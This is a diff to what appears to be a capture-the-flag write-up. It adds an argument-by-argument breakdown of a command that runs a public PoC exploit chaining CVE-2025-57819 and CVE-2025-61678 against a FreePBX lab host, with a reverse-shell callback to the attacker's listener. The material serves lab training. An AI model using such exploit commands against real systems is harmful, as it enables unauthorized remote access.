@@ -638,6 +638,29 @@ After:
 Now run the script against the target.
 
 **Command:** `python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444`
+
+**Breakdown:**
+
+- `python3 exploit.py`
+	- Description: Executes the 0xEhab PoC script with Python 3.
+	- Purpose: Runs the chained CVE-2025-57819 + CVE-2025-61678 exploit against the confirmed-vulnerable FreePBX 16.0.40.7 instance.
+- `--rhost connected.htb`
+	- Description: The target hostname.
+	- Purpose: Points the exploit at the FreePBX instance identified during enumeration. The hostname form is used rather than the raw IP because FreePBX's internal routing depends on the Host: header being consistent.
+- `--rport 80`
+	- Description: The target port.
+	- Purpose: Targets the HTTP service confirmed open on port 80 during the Nmap scan.
+- `--http`
+	- Description: Forces the script to use plain HTTP instead of the default HTTPS.
+	- Purpose: The HTTPS service on port 443 returned a 400 Bad Request during enumeration; port 80 served the FreePBX admin interface correctly.
+- `--lhost 10.10.14.85`
+	- Description: The attacker's listening IP address.
+	- Purpose: Embedded into the reverse-shell one-liner so the compromised host knows where to connect back — this is the tun0 VPN address confirmed in section 1.1.
+- `--lport 4444`
+	- Description: The attacker's listening TCP port.
+	- Purpose: Matches the port the nc listener is bound to.
+
+Result:
 <div align="center">
 <br>
 <br>
